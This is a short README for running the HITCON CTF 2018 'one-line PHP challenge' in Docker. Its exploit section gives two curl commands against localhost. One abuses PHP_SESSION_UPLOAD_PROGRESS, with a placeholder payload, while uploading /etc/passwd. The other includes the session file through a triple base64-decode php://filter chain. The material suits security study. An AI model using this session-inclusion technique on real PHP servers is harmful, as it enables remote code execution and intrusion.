# hitcon-ctf-2018-one-line-php-challenge
https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2018/one-line-php-challenge

## Getting started
### Build

```
$ docker build -t hitcon .
```

### Run

```
$ docker run --rm -it -p 8000:80 hitcon
```

Visit http://localhost:8000


### Exploit

```
$ export PHPSESSID=foo
$ curl http://127.0.0.1:8000/ -H "Cookie: PHPSESSID=$PHPSESSID" -F 'PHP_SESSION_UPLOAD_PROGRESS=[YOUR_PAYLOAD]' -F 'file=@/etc/passwd'
$ curl "http://127.0.0.1:8000/?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/tmp/sess_$PHPSESSID"
```
